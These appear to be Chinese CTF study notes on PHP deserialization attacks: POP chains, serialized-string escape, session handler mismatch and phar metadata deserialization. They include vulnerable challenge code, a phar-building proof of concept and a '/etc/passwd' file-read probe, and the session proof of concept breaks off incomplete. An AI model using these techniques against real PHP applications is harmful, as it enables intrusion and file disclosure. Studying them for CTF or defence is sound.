pop链分析
1. 目标：触发echo,调用flag
2. 第一步：触发invoke,调用append,并使var=flag.php
3. invoke触发条件，把对象当成函数
4. 给$p赋值为对象，即function成为对象Modifier,却被当成函数调用，触发Modifier中的invoke
5. 第二步，触发get,即调用不存在的成员属性，
6. 给$str赋值为对象Test,而Test不存在成员属性source,则可触发Test里的成员方法get
7. 第三步：触发tostring(触发条件，把对象当字符串)
8. 给$source赋值为对象show，当成字符串被echo调用，触发tostring
9. 最终步：触发wakeup,(反序列化unserialize)

## 字符串逃逸
#### 逃逸减少
反序列化以`;}`结束，后面的字符串不影响正常的反序列化
```php
<?php

class A{
    public $v1="a\"b";
    public $v3="ji35423";
}
echo serialize(new A());
```
输出`O:1:"A":2:{s:2:"v1";s:3:"a"b";s:2:"v3";s:7:"ji35423";}`其中"时格式字符还是字符串，是由前面的长度决定的
`$a='O:1:"A":2:{s:2:"v1";s:3:"a"b";s:2:"v3";s:7:"ji35423";}s:2:"v2";N;}';`在前面字符串没有问题的情况下，`;}`是反序列化结束符，后面的字符串不影响反序列化结果

## session反序列化漏洞
当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化之后，存储到指定目录（默认为/tmp）
**漏洞产生原因**:写入格式和读取格式不一致
存储数据格式有多种，常见的有三种：
- **php**：键名+竖线+经过serialize()函数序列化处理的值
- **php_serialize**(php>=5.5.4):经过serialize()函数处理后的数组。
例题
```php
<?php
highlight_file(__FILE__);
/*hint.php*/
session_start();
class Flag{
    public $name;
    public $her;
    function __wakeup(){
        $this->her=md5(rand(1, 10000));
        if ($this->name===$this->her){
            include('flag.php');
            echo $flag;
        }
    }
}
?>
```
访问
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['a'] = $_GET['a'];
?>
```
写是按php_serialize写的，读默认以php读取，所以有session漏洞，MD5rand用引用绕过，所以
poc
```php
<?php
class Flag{

    public $her;
}

```

## phar反序列化漏洞
phar是php里类似jar的一种打包文件，文件包含：phar伪协议可读取.phar文件，
**manifest**:压缩文件的属性信息，以序列化存储，
phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化
phar需要php>=5.2,再php.ini中phar.readonly设为off
phar文件不看后缀，直接改后缀依然可以解析为phar文件
例题
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class TestObject {
    public function __destruct() {
        include('flag.php');
        echo $flag;
    }
}
$filename = $_POST['file'];
if (isset($filename)){
    echo md5_file($filename);
}
//upload.php
?>
```
访问upload.php,是一个文件上传的界面，
首先测试一下，`file=/etc/passwd`如果这个文件存在，会返回一个MD5哈希值
解析步骤：生成一个phar文件，再mata-data里放置一个TestObject的序列化字符串；上传文件md5_file执行phar伪协议，触发反序列化，反序列化操作触发_destruct，执行echo $flag
用代码再本地执行，生成一个phar文件，上传到服务器
```php
<?php
class TestObject {
}
@unlink('test.phar');   //删除之前的test.par文件(如果有)
$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀
$phar->startBuffering();  //开始写文件
$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub
$o=new TestObject();  //创建一个对象
$phar->setMetadata($o);//写入meta-data
$phar->addFromString("test.txt","test");  //添加要压缩的文件
$phar->stopBuffering();
?>
```
